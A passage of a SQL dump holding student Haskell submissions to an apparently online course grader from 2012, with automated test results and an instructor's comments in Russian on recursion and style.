(133, 18, '1384577', '2012-09-07 09:03:01', 1, 'f 1 = 2\r\nf n | n > 0 = 1 + 1 / f (n-1)', '<br/>Тесты успешно пройдены!'),
(134, 19, '1384577', '2012-09-07 09:03:30', 1, 's 0 = 0\r\ns n | n > 0 = s (n - 1) + sin n\r\n   --- ОК, засчитано но только это вовсе не хвостовая рекурсия\r\n\r\nsumsin 0 = 0\r\nsumsin n | n > 0 = (sin (sum [1..n]))/(s n)', '<br/>Тесты успешно пройдены!'),
(135, 24, '1384577', '2012-09-07 10:48:04', 1, 'f (n,a) | n < a = n + 1/f(n+1,a) \r\n        | otherwise = a\r\n   -- В Haskell в параметраз не надо писать ни скобки ни запятые...\r\n\r\nb a = f(0,a)', '<br/>Тесты успешно пройдены!'),
(136, 24, '1730564', '2012-09-07 13:45:48', 0, 'saf', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(137, 24, '1730564', '2012-09-07 13:46:24', 0, 'asfaf', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(138, 24, '1730564', '2012-09-07 13:46:55', 0, 'sss', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(139, 19, '1730564', '2012-09-07 13:47:39', 0, 'ss', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(140, 24, '1730564', '2012-09-07 14:03:32', 0, 'sdfs', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(141, 24, '1730564', '2012-09-07 14:09:48', 1, 'b :: Double -> Double\r\n  --- Типы функций в Хаскеле почти везде можно не писать, копилятор сам их определяет по тексту программы\r\nb n = ba 0 n\r\n\r\nba :: Double -> Double -> Double\r\nba m n | m == n = n\r\n	| otherwise = m + 1 / ba (m + 1) n', '<br/>Тесты успешно пройдены!'),
(142, 20, '1730564', '2012-09-07 14:12:19', 1, 'sumfact :: Integer -> Integer\r\nsumfact n = sumfact1 1 1 n\r\n\r\n\r\nsumfact1 :: Integer -> Integer -> Integer -> Integer\r\nsumfact1 k m n | m  < n = k + sumfact1 (k * (m + 1)) (m + 1) n\r\n			   | m == n = k', '<br/>Тесты успешно пройдены!'),
(143, 19, '1730564', '2012-09-07 14:13:00', 1, 'sumsin :: Double -> Double\r\nsumsin n | n < 0 = error "negative n"\r\n         | otherwise = sin ( (1 + n) * n / 2 ) / sumsin1(n)\r\n\r\n\r\nsumsin1 :: Double -> Double\r\nsumsin1 n | n > 0 = sin n + sumsin1 (n - 1)\r\n   --- Засчитано, но это не совсем по условию, надо было использовать хвостовую рекурсию\r\n		  | n == 0 = 0', '<br/>Тесты успешно пройдены!'),
(144, 21, '1730564', '2012-09-07 16:43:24', 0, 'seq :: Integer -> Integer\r\nseq n = seq1 1 0 n\r\n\r\nseq1 :: Integer -> Integer -> Integer -> Integer\r\nseq1 m s n | m >  n - s = 0\r\n		   | m == n - s = 1\r\n		   | otherwise  = seq1 (m + 1) (s + m) n + seq1 (m + 1) s n	', 'Не удалось вычислить выражение "seq 1", проверьте правильность синтаксиса'),
(145, 21, '1730564', '2012-09-07 16:44:11', 0, 'seq :: Integer -> Integer\r\nseq2 n = seq1 1 0 n\r\n\r\nseq1 :: Integer -> Integer -> Integer -> Integer\r\nseq1 m s n | m >  n - s = 0\r\n		   | m == n - s = 1\r\n		   | otherwise  = seq1 (m + 1) (s + m) n + seq1 (m + 1) s n', 'Не удалось вычислить выражение "seq 1", проверьте правильность синтаксиса'),
(146, 21, '517309', '2012-09-07 17:42:23', 0, 'seq x = 9', 'Не удалось вычислить выражение "seq 1", проверьте правильность синтаксиса'),
(147, 21, '517309', '2012-09-07 17:43:57', 0, 'nseq _ = 1', 'Не удалось вычислить выражение "seq 2", проверьте правильность синтаксиса'),
(148, 21, '517309', '2012-09-07 17:49:06', 3, 'nseq _ = 1', 'Выражение имеет неправильное значение: nseq 3'),
(149, 21, '1730564', '2012-09-07 17:50:35', 1, 'nseq :: Integer -> Integer\r\nnseq n = seq1 1 0 n\r\n\r\nseq1 :: Integer -> Integer -> Integer -> Integer\r\nseq1 m s n | m >  n - s = 0\r\n		   | m == n - s = 1\r\n		   | otherwise  = seq1 (m + 1) (s + m) n + seq1 (m + 1) s n		', '<br/>Тесты успешно пройдены!'),
(150, 20, '44060', '2012-09-07 19:16:54', 0, 'fact(0)=1\r\n\nfact(n) = n*fact(n-1)\r\n\nsumfact(0)=0\r\n\nsumfact(a) = fact(a) + sumfact(a-1)\r\n\n\n', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(151, 20, '44060', '2012-09-07 19:17:49', 0, 'fact(0)=1\r\n\nfact(n) = n*fact(n-1)\r\n\nsumfact(0)=1\r\n\nsumfact(1) =1\r\n\nsumfact(a) = fact(a) + sumfact(a-1)\r\n\n\n', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(152, 18, 'Deutsche', '2012-09-07 19:44:13', 0, 'f n = 1+(frac numerator denominator n)\r\nnumerator _ = 1\r\ndenominator _ = 1\r\nfrac numerator denominator n = frac1 n 0\r\nfraс1 i erg = \r\n	if i == 0 then erg\r\n	else frac1 (i-1) ((numerator i) / ((denominator i) + erg))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(153, 18, 'Deutsche', '2012-09-07 19:59:54', 0, 'f n = 1+(frac numerator denominator n)\r\nnumerator j = 1\r\ndenominator j = 1\r\nfrac numerator denominator n = frac1 n 0\r\nfraс1 i erg = \r\n	if i == 0 then erg\r\n	else frac1 (i-1) ((numerator i) / ((denominator i) + erg))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(154, 18, 'Deutsche', '2012-09-07 20:02:11', 0, 'f n = 1+(frac n)\r\nnumerator j = 1\r\ndenominator j = 1\r\nfrac n = frac1 n 0\r\nfraс1 i erg = \r\n	if i == 0 then erg\r\n	else frac1 (i-1) ((numerator i) / ((denominator i) + erg))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(155, 18, 'Deutsche', '2012-09-07 20:04:00', 0, 'f n = 1+(frac num denom n)\r\nnum j = 1\r\ndenom j = 1\r\nfrac num denom n = frac1 n 0\r\nfraс1 i erg = \r\nif i == 0 then erg\r\nelse frac1 (i-1) ((num i) / ((denom i)+erg))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(156, 18, 'Deutsche', '2012-09-07 20:12:02', 0, 'f n = frac num denom n\r\nnum _ = 1\r\ndenom _ = 1\r\nfrac num denom n = frac1 n 0\r\nfraс1 i erg = \r\nif i == 0 then erg+1\r\nelse frac1 (i-1) ((num i) / ((denom i)+erg))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(157, 18, 'Deutsche', '2012-09-07 20:18:19', 0, 'f n = frac num denom n\r\nnum _ = 1\r\ndenom _ = 1\r\nfrac num denom n = frac1 n 0\r\nfraс1 i erg = \r\nif i == 0 then 1+erg\r\nelse frac1 (i-1) (num i / (denom i + erg))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(158, 18, 'Deutsche', '2012-09-07 20:22:23', 0, 'f n = frac1 n 0\r\nnum _ = 1\r\ndenom _ = 1\r\nfraс1 i erg = if i == 0 \r\n		then 1+erg\r\n		else frac1 (i-1) (num i / (denom i + erg))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(159, 18, 'Deutsche', '2012-09-07 20:26:54', 0, 'f n = fract n 0\r\nfraсt i erg = if i == 0 \r\n	      then 1+erg\r\n              else fract (i-1) (num i / (denom i + erg))\r\nnum j = 1\r\ndenom j = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(160, 18, 'Deutsche', '2012-09-07 20:31:08', 0, 'f n = fract n 0\r\nfract 0 erg = 1+erg\r\nfraсt i erg = fract (i-1) (num i / (denom i + erg))\r\nnum j = 1\r\ndenom j = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(161, 18, 'Deutsche', '2012-09-07 20:33:20', 1, 'f n = fract n 0\r\nfract 0 erg = 1+erg\r\nfraсt i erg = fract (i-1) (1 / (1 + erg))\r\n --- У вас тут первое fract во второй строке написано как-то не так - видимо то ли a то ли с русская\r\n  --- Но ОК, засчитано\r\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(162, 20, '44060', '2012-09-07 21:07:23', 1, 'sumfact n | n > 0 = a n 2 2 1\r\n\r\na 1 fact p rezult = rezult\r\n\r\na n fact p rezult = a (n-1) (fact*(p+1))(p + 1)(fact + rezult)\r\n\r\n\r\n', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(163, 24, '44060', '2012-09-07 21:23:17', 0, 'f n | n >0 = s n n\r\n\ns 0 rezult = rezult\r\n\ns n rezult = s (n-1) ((n-1) + 1/rezult)\n', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(164, 24, '44060', '2012-09-07 21:26:50', 1, 'b n | n >0 = s n n\r\n\r\ns 0 rezult = rezult\r\n\r\ns n rezult = s (n-1) ((n-1) + 1/rezult)\r\n', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(165, 18, 'erwert', '2012-09-08 02:37:32', 1, 'f 1 = 2\r\nf n = 1 + 1 / f (n - 1)', '<br/>Тесты успешно пройдены!'),
(166, 18, '787463', '2012-09-08 07:03:58', 1, 'f 1 = 1 + 1 / 1\r\nf n = 1 + 1 / f (n - 1)', '<br/>Тесты успешно пройдены!'),
(167, 24, '787463', '2012-09-08 07:05:11', 1, 'b n = b1 0 n\r\nb1 n 0 = n\r\nb1 x y = x + 1 / b1 (x + 1) (y - 1)', '<br/>Тесты успешно пройдены!'),
(168, 19, '787463', '2012-09-08 07:06:16', 1, 'sumsin n = sumsin1 n 0 0\r\nsumsin1 0 sum sumS = sin sum / sumS\r\nsumsin1 n sum sumS = sumsin1 (n - 1) (sum + n) (sumS + sin n)', '<br/>Тесты успешно пройдены!'),
(169, 20, '787463', '2012-09-08 07:07:35', 1, 'sumfact n = sumfact1 n 1 0 1\r\nsumfact1 n i sum fact\r\n  | i <= n = sumfact1 n (i + 1) (sum + fact) (fact * (i + 1))\r\n  | otherwise = sum', '<br/>Тесты успешно пройдены!'),
(170, 21, '787463', '2012-09-08 07:08:33', 1, 'nseq n = nseq2 n 1 0\r\nnseq1 n k\r\n  | k == 1 = 1\r\n  | n > k = nseq1 (n - k) k + nseq1 (n - k) (k - 1)\r\n  | otherwise = 0\r\nnseq2 n i sum\r\n  | i <= n = nseq2 n (i + 1) (sum + nseq1 n i)\r\n  | otherwise = sum', '<br/>Тесты успешно пройдены!'),
(171, 19, '397095', '2012-09-08 10:39:24', 0, 'sumsin n = ss n s d\r\nss 0 s d = sin s / d\r\nss n s d = ss (n-1) (s+n) (d+sin n)', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(172, 19, '397095', '2012-09-08 10:40:13', 1, 'sumsin n = ss n 0 0\r\nss 0 s d = sin s / d\r\nss n s d = ss (n-1) (s+n) (d+sin n)', '<br/>Тесты успешно пройдены!'),
(173, 24, '517309', '2012-09-08 10:51:57', 3, 'b n | n >0 = s n n\r\n\r\ns 0 rezult = rezult\r\n\r\ns n rezult = s (n-1) ((n-1) + 1/rezult)\r\n', '<br/>Тесты успешно пройдены!'),
(174, 20, '397095', '2012-09-08 11:52:24', 1, 'sumfact n = sf n 1 1 0\r\nsf n i f s = if (n==i) \r\n              then (f+s) \r\n              else sf n (i+1) (f*(i+1)) (s+f)', '<br/>Тесты успешно пройдены!'),
(175, 18, '397095', '2012-09-08 11:52:56', 1, 'f n = ff n 0\r\nff 0 s = 1+s\r\nff n s = ff (n-1) (d s)\r\nd x = 1 / (1+x)', '<br/>Тесты успешно пройдены!'),
(176, 24, '397095', '2012-09-08 11:53:38', 1, 'b n = ff n 0\r\nff 0 s = s\r\nff n s = ff (n-1) (d n s)\r\nd n x = 1 / (n+x)', '<br/>Тесты успешно пройдены!'),
(177, 24, 'Deutsche', '2012-09-08 13:37:27', 1, 'b n = b1 n 0\r\nb1 0 erg = erg\r\nb1 n erg = b1 (n-1) (1/(n+erg))', '<br/>Тесты успешно пройдены!'),
(178, 19, 'Deutsche', '2012-09-08 13:38:20', 1, 'sumsin n = sumsin1 n 0 0\r\nsumsin1 0 s1 s2 = (sin s1)/s2\r\nsumsin1 n s1 s2 = sumsin1 (n-1) (s1+n) (s2+(sin n))\r\n  --- Просто как замечание, скобки вокруг sin везде можно не писать.', '<br/>Тесты успешно пройдены!'),
(179, 20, 'Deutsche', '2012-09-08 13:39:15', 1, 'sumfact n = sumfact1 n 1 0 1\r\nsumfact1 0 i s p = s\r\nsumfact1 n i s p = sumfact1 (n-1) (i+1) (s+p) (p*(i+1))', '<br/>Тесты успешно пройдены!'),
(180, 18, 'B@rmaley.exe', '2012-09-08 14:30:55', 1, 'f :: Int -> Double\r\n   --- OK, все правильно. Почему тест не проходит, я пока не могу сказать, видимо какая-то \r\n   --- ошибка системы тестирования.\r\n   --- Только одно замечание - тип функции тут (и в Хаскеле практичеки везде) модно не писать.\r\nf 0 = 1\r\n\r\nf n = 1 + 1 / f (n-1)\r\n  \r\n\r\n\r\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(181, 18, '2562137', '2012-09-08 17:18:52', 1, 'f 0 = 1\r\nf n = 1 + 1 / f (n - 1)', '<br/>Тесты успешно пройдены!'),
(182, 24, '2562137', '2012-09-08 17:28:48', 1, 'b n = f 0 n\r\nf k n\r\n	| k == n = n\r\n	| otherwise = k + 1 / f (k+1) n', '<br/>Тесты успешно пройдены!'),
(183, 19, '2562137', '2012-09-08 17:31:55', 1, 'sumsin n = f n 0 0\r\nf 0 s1 s2 = sin(s1) / s2\r\n   --- Просто как замечание, тут скобки вокруг s1 не нужны.\r\nf n s1 s2 = f (n - 1) (s1 + n) (s2 + sin n)', '<br/>Тесты успешно пройдены!'),
(184, 20, '2562137', '2012-09-08 17:37:01', 1, 'sumfact n = f n 1 1 0\r\nf n i p s\r\n	| i > n = s\r\n	| otherwise = f n (i + 1) (p * i) (s + p * i)\r\n', '<br/>Тесты успешно пройдены!'),
(185, 21, '2562137', '2012-09-08 17:51:09', 1, 'nseq n = f n 1\r\n\r\nf need_sum curr_num \r\n	| need_sum == 0 = 1\r\n	| curr_num > need_sum = 0\r\n	| otherwise = f need_sum (curr_num+1) +\r\n	              f (need_sum - curr_num) (curr_num+1)', '<br/>Тесты успешно пройдены!'),
(186, 18, '419046', '2012-09-08 17:55:23', 0, 'f 0 = 1\r\n\nf n = 1 + 1 / f (n - 1)\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(187, 19, '419046', '2012-09-08 17:57:11', 0, 'sumsin n = sumsin1 n 0 0\r\n\nsumsin1 0 s p = sin s / p\r\n\nsumsin1 n s p = sumsin1 (n - 1) (s + n) (sin n + p)\r\n\n\n', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(188, 20, '419046', '2012-09-08 17:58:14', 0, 'sumfact n = summa n 0\r\n\nsumma 0 s = s\r\n\nsumma n s = summa (n - 1) (s + fact1 n 1 )\r\n\nfact1 0 p = p\r\n\nfact1 n p = fact1 (n - 1) (p * n) \r\n\n\n', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(189, 20, '419046', '2012-09-08 17:58:43', 0, 'sumfact n = summa n 0\r\nsumma 0 s = s\r\nsumma n s = summa (n - 1) (s + fact1 n 1 )\r\nfact1 0 p = p\r\nfact1 n p = fact1 (n - 1) (p * n) ', '<br/>Тесты успешно пройдены!'),
(190, 20, '419046', '2012-09-08 17:58:52', 1, 'sumfact n = summa n 0\r\n\r\nsumma 0 s = s\r\n\r\nsumma n s = summa (n - 1) (s + fact1 n 1 )\r\n\r\nfact1 0 p = p\r\n\r\nfact1 n p = fact1 (n - 1) (p * n) \r\n  --- OK, засчитано, но на самом деле так не очень эффективно. Получается, что вы на каждом шаге заново\r\n  --- вычисляете факториал. Скажем, вы сосчитали 10! а потом с начала считаете 11!, \r\n  --- хотя достаточно было предыдущее число умножить на 11. С помощью накапливающих параметров как раз \r\n  --- легко это записать более эффективно. Но ОК, это мы обсудим.\r\n  ---  А почему тесты не проходят, я не знаю, видимо какой-то баг в системе тестирования. Вообще-то все правильно.\r\n\r\n\r\n', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(191, 18, '419046', '2012-09-08 17:59:09', 1, 'f 0 = 1\r\nf n = 1 + 1 / f (n - 1)', '<br/>Тесты успешно пройдены!'),
(192, 19, '419046', '2012-09-08 17:59:42', 1, 'sumsin n = sumsin1 n 0 0\r\nsumsin1 0 s p = sin s / p\r\nsumsin1 n s p = sumsin1 (n - 1) (s + n) (sin n + p)\r\n', '<br/>Тесты успешно пройдены!'),
(193, 24, '419046', '2012-09-08 19:51:47', 1, 'b n = b1 n n\r\nb1 0 m = m\r\nb1 n m = b1 (n - 1) ((n - 1) + 1 / m)\r\n   -- просто как замечание, я бы второй параметр назвал не m, а например x.\r\n   -- m просто для большинства людей обычно подразумевает целое число, трудно будет читать.', '<br/>Тесты успешно пройдены!'),
(194, 21, '397095', '2012-09-08 19:54:21', 1, 'nseq n = fff n 1 0 \r\n\r\n{-- \r\n  Sum i=1..n f(n,i)\r\n--}\r\nfff n i s\r\n | i >= n = s + 1 -- all sequences + sequence [n]\r\n | otherwise = fff n (i+1) (s + f n i) \r\n\r\n-- Number of sequences with sum = n beginning from d\r\nf n d\r\n | d > n = 0\r\n | d == n = 1\r\n | otherwise = ff (d+1) n d 0\r\n\r\n{--\r\n  Sum i=d+1..n f(n-d,i)\r\n--}\r\nff i n d s\r\n | i >= n = s\r\n | otherwise = ff (i+1) n d (s + f (n-d) i)', '<br/>Тесты успешно пройдены!'),
(195, 20, '517309', '2012-09-08 20:51:24', 0, 'sumfact n = summa n 0\r\n\r\nsumma 0 s = s\r\n\r\nsumma n s = summa (n - 1) (s + fact1 n 1 )\r\n\r\nfact1 0 p = p\r\n\r\nfact1 n p = fact1 (n - 1) (p * n)', '<br/>Тесты успешно пройдены!'),
(196, 20, '517309', '2012-09-08 20:55:01', 3, 'sumfact n = summa n 0\r\n\r\nsumma 0 s = s\r\n\r\nsumma n s = summa (n - 1) (s + fact1 n 1 )\r\n\r\nfact1 0 p = p\r\n\r\nfact1 n p = fact1 (n - 1) (p * n)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(197, 18, '517309', '2012-09-08 21:01:44', 3, 'f :: Int -> Double\r\n\r\nf 0 = 1\r\n\r\nf n = 1 + 1 / f (n-1)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(198, 18, '12206137', '2012-09-08 22:00:55', 0, 'f 0 = 1.0\n\nf n = 1.0 + 1.0 / f (n-1)\n\n\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(199, 18, '12206137', '2012-09-08 22:08:11', 1, 'f 0 = 1.0\r\nf n = 1.0 + 1.0 / f (n-1)', '<br/>Тесты успешно пройдены!'),
(200, 24, '12206137', '2012-09-08 22:16:56', 1, 'b_ 0 res = res\r\nb_ n res = b_ (n-1) (1.0 / (n + res))\r\nb n = b_ n 0', '<br/>Тесты успешно пройдены!'),
(201, 19, '12206137', '2012-09-08 22:32:51', 1, 'sum_ n = sin $ n * (n + 1) / 2\r\ns_sum 0 res = res\r\ns_sum n res = s_sum (n-1) (res + sin n)\r\nsumsin n = sum_ n / s_sum n 0', '<br/>Тесты успешно пройдены!'),
(202, 20, '12206137', '2012-09-08 22:50:09', 1, 'sum_ i res fact n =\r\n	if i > n then\r\n		res\r\n	else\r\n		let newFact = fact * i in\r\n		sum_ (i + 1) (res + newFact) newFact n\r\nsumfact n = sum_ 1 0 1 n ', '<br/>Тесты успешно пройдены!'),
(203, 21, '12206137', '2012-09-08 23:01:45', 1, 'count res min rem =\r\n	if rem == 0 then res + 1 \r\n	else if rem < min then res\r\n	else\r\n		count res (min + 1) rem + count res (min + 1) (rem - min)\r\nnseq n = count 0 1 n', '<br/>Тесты успешно пройдены!'),
(204, 18, '517309', '2012-09-09 07:44:47', 1, '1\r\n  ----   test', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(205, 22, '517309', '2012-09-09 10:08:14', 2, 'g n = n > 6', 'Выражение имеет неправильное значение: g 11'),
(206, 23, '517309', '2012-09-09 10:08:51', 0, 'c _ = 3', 'Выражение имеет неправильное значение: c 10'),
(207, 23, '517309', '2012-09-09 10:09:10', 2, 'c x = 6', 'Выражение имеет неправильное значение: c 3'),
(208, 18, '51559263', '2012-09-09 10:31:44', 1, 'f 0 = 1\r\nf n = 1 + 1 / f(n - 1)', '<br/>Тесты успешно пройдены!'),
(209, 24, '51559263', '2012-09-09 10:35:24', 1, 'bb 0 m = m\r\nbb n m = m + 1/bb (n - 1) (m + 1)\r\nb n = bb n 0', '<br/>Тесты успешно пройдены!'),
(210, 19, '51559263', '2012-09-09 10:41:07', 1, 'ss 0 ism osm = sin ism / osm\r\nss n ism osm = ss (n - 1) (ism + n) (osm + sin n)\r\nsumsin n = ss n 0 0\r\n', '<br/>Тесты успешно пройдены!'),
(211, 20, '51559263', '2012-09-09 10:46:07', 1, 'sf c 0 p s = s + p\r\nsf c n p s = sf c (n - 1) (p * (c - n + 1)) (s + p)\r\nsumfact n = sf n n 1 (-1)', '<br/>Тесты успешно пройдены!'),
(212, 22, '397095', '2012-09-09 11:01:55', 2, 'is_prime n\r\n | n == 1 = False\r\n | otherwise = gg n 2\r\n\r\ngg n d\r\n | div n 2 < d = True \r\n | mod n d == 0 = False \r\n | otherwise = gg n (d+1)\r\n\r\ng n = f 2 (n-2)\r\n\r\nf a b \r\n | (is_prime a) && (is_prime b) = True \r\n | a >= b = False\r\n | otherwise = f (a+1) (b-1)\r\n     --- Простые числа по условию дб различными ', 'Выражение имеет неправильное значение: g 6'),
(213, 18, '2118411', '2012-09-09 11:04:22', 1, 'f 1 = (1+1/1)\r\nf n = 1+1/(f (n-1))', '<br/>Тесты успешно пройдены!'),
(214, 22, '397095', '2012-09-09 11:10:02', 1, 'is_prime n\r\n | n == 1 = False\r\n | otherwise = gg n 2\r\n\r\ngg n d\r\n | div n 2 < d = True \r\n | mod n d == 0 = False \r\n | otherwise = gg n (d+1)\r\n\r\ng n = f 2 (n-2)\r\n\r\nf a b \r\n | a >= b = False\r\n | (is_prime a) && (is_prime b) = True\r\n | otherwise = f (a+1) (b-1) ', '<br/>Тесты успешно пройдены!'),
(215, 24, '2118411', '2012-09-09 11:12:54', 1, 'b n = b1 n 1\r\nb1 1 p = (p-1)+1/p\r\nb1 n p = (p-1) + 1 / (b1 (n-1) (p+1))', '<br/>Тесты успешно пройдены!'),
(216, 18, '63706456', '2012-09-09 11:16:03', 0, 'f 1 = 1\r\nf n = 1 / (1 + f n-1)', 'Выражение имеет неправильное значение: f 1'),
(217, 18, '63706456', '2012-09-09 11:16:40', 0, 'f 1 = 1.0\r\nf n = 1 / (1 + f n-1)', 'Выражение имеет неправильное значение: f 1'),
(218, 18, '63706456', '2012-09-09 11:17:12', 0, 'f 1 = 1.0\r\nf n = 1 / (1 + (f n-1))', 'Выражение имеет неправильное значение: f 1'),
(219, 18, '63706456', '2012-09-09 11:18:20', 1, 'f 1 = 1.0\r\n  -- нет, не совсем так, вы посмотрите на формулу внимательно.. \r\nf n = 1 / (1 + (f n-1))\r\n  -- второй раз при вызове f у вас неправильно стоят скобки - вспомните, что мы говорили о порядке вызова. \r\n  -- И, на самом деле, формула у вас не совсем правильная - у вас же так ответ всегда будет меньше 1  \r\n\r\nmain = f\r\n  -- main для систему тестирования писать не надо, но если писать, то правильно как-то так:  \r\n  --   main = f 10\r\n  -- те main - это вызов функции уже с параметром ', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(220, 19, '2118411', '2012-09-09 11:21:19', 1, 'sumsin n = sumtmp n 0 0\r\nsumtmp 0 u b = (sin u) / b\r\nsumtmp n u b = sumtmp (n-1) (u+n) (b+sin(n))\r\n  -- скобки вокруг sin можно не писать', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(221, 18, '517309', '2012-09-09 11:29:49', 0, 'f 1 = 1.0\r\nf n = 1 / (1 + (f n-1))\r\n\r\nmain = f', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(222, 18, '517309', '2012-09-09 11:30:18', 0, 'f 1 = 1.0\r\nf n = 1 / (1 + (f n-1))', 'Выражение имеет неправильное значение: f 1'),
(223, 18, '517309', '2012-09-09 11:31:01', 0, 'f 1 = 2\r\nf n = 1 / (1 + (f n-1))', 'Не удалось вычислить выражение "let phi = f 100 in (phi > 1.618) && (phi < 1.619)", проверьте правильность синтаксиса'),
(224, 18, '517309', '2012-09-09 11:34:35', 0, 'f 1 = 1.0\r\nf n = 1 / (1 + (f (n-1)))\r\n\r\nmain = f', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(225, 18, '517309', '2012-09-09 11:34:57', 0, 'f 1 = 1.0\r\nf n = 1 / (1 + (f (n-1)))', 'Выражение имеет неправильное значение: f 1'),
(226, 18, '517309', '2012-09-09 11:35:19', 0, 'f 1 = 2.0\r\nf n = 1 / (1 + (f (n-1)))', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: При больших f получается замечательное число (первое описание - Евклид, примерно 300 г. до н.э.)'),
(227, 20, '2118411', '2012-09-09 11:35:43', 1, 'sumfact n = stmp n 1\r\nstmp 1 p = p\r\nstmp n p = p * (1 + stmp (n-1) (p+1))', '<br/>Тесты успешно пройдены!'),
(228, 18, '517309', '2012-09-09 11:36:31', 3, 'f 1 = 2.0\r\nf n = 1 + 1 / f (n-1)', '<br/>Тесты успешно пройдены!'),
(229, 22, '2118411', '2012-09-09 12:12:57', 1, 'isPrime n = isPrime1 2 n\r\nisPrime1 d p    | d * d > p             = True\r\n                | p `mod` d == 0        = False\r\n                | otherwise             = isPrime1 (d+1) p\r\n\r\ng n = gtmp n 2\r\ngtmp n k        | k >= (n `div` 2)      = False\r\n                | otherwise     = (isPrime k) && (isPrime (n-k)) || (gtmp n (k+1))', '<br/>Тесты успешно пройдены!'),
(230, 22, '2562137', '2012-09-09 13:31:16', 0, 'g n = h n [1 .. (n-1) `div` 2] \r\n\r\nh n [] = False\r\nh n (x:xs) = is_prime x && is_prime (n-x) || h n xs\r\n\r\ndividers n = filter (x -> mod n x == 0) [1..n]\r\nis_prime n = dividers n == [1, n]\r\n', '<br/>Тесты успешно пройдены!'),
(231, 22, '12206137', '2012-09-09 13:44:45', 1, 'prime n =\r\n	prime_ 2 (round $ sqrt $ fromIntegral n)\r\n	where prime_ i lim =\r\n		if i > lim then True\r\n		else if n `mod` i == 0 then False\r\n		else prime_ (i+1) lim\r\n\r\ngo fst snd =\r\n	if fst >= snd then False\r\n	else if prime fst && prime snd then True\r\n	else go (fst + 1) (snd - 1)\r\n\r\ng n = go 2 (n-2)', '<br/>Тесты успешно пройдены!'),
(232, 22, '2562137', '2012-09-09 13:53:54', 1, 'g n = check_sum n 2\r\n\r\ncheck_sum n x = x < (n-x) && (is_prime x && is_prime (n-x) || check_sum n (x+1))\r\n\r\ncheck_comp n k = k < n && (mod n k == 0 || check_comp n (k+1))\r\n\r\nis_prime n = n /= 1 && not (check_comp n 2)\r\n', '<br/>Тесты успешно пройдены!'),
(233, 23, '2562137', '2012-09-09 14:00:35', 1, 'c n = f n 1 1\r\n\r\nf need_sum curr_num curr_prod\r\n	| need_sum == 0 = 1\r\n	| curr_num > need_sum = 0\r\n	| mut_prime curr_num curr_prod =\r\n		f (need_sum - curr_num) (curr_num+1) (curr_prod * curr_num) +\r\n		f need_sum (curr_num+1) curr_prod\r\n	| otherwise =\r\n		f need_sum (curr_num+1) curr_prod\r\n\r\nmut_prime a b = check_mut_prime a b 2\r\n\r\ncheck_mut_prime a b i\r\n	| i > a || i > b = True\r\n	| mod a i == 0 && mod b i == 0 = False\r\n	| otherwise = check_mut_prime a b (i+1)\r\n   -- Я бы конечно тут применил алгоритм Евклида', '<br/>Тесты успешно пройдены!'),
(234, 18, '4169333', '2012-09-09 14:05:55', 1, 'f 0=1\r\nf n=1+1/f(n-1)', '<br/>Тесты успешно пройдены!'),
(235, 23, '12206137', '2012-09-09 14:14:03', 1, 'coprime a b =\r\n	if a == 0 then b == 1\r\n	else coprime (b `mod` a) a\r\n\r\ncount curList res min rem \r\n	| rem == 0 = 1\r\n	| min > rem = res\r\n	| otherwise =\r\n		let simple = count curList res (min + 1) rem in\r\n		if not $ all (coprime min) curList then simple\r\n		else simple + count (min : curList) res (min + 1) (rem - min)\r\n\r\nc n = count [] 0 1 n\r\n	', '<br/>Тесты успешно пройдены!'),
(236, 22, '1730564', '2012-09-09 14:24:53', 1, 'g n = g1 ((map (n-) (allPrimes [1..]))) n\r\n\r\ng1 [] n = False\r\ng1 (head:tail) n | (abs head) > n || head * 2 == n = False\r\n                 | otherwise = if (isPrime head) then True else g1 tail n\r\n\r\nallPrimes [] = []\r\nallPrimes a = if (isPrime (head a)) then (head a : allPrimes (tail a)) else allPrimes (tail a)\r\n   -- или просто allPrimes = filter isPrime\r\n\r\nisPrime n | n <= 1 = False\r\n		  | otherwise = isPrime1 2 n\r\n\r\nisPrime1 a n | a < n = if ((mod n a) == 0) then False else isPrime1 (a + 1) n\r\n   -- скобки вокруг mod можно не писать\r\n   -- На самом деле достаточно ведь проверять пока a*a < n  \r\n             | otherwise = True', '<br/>Тесты успешно пройдены!'),
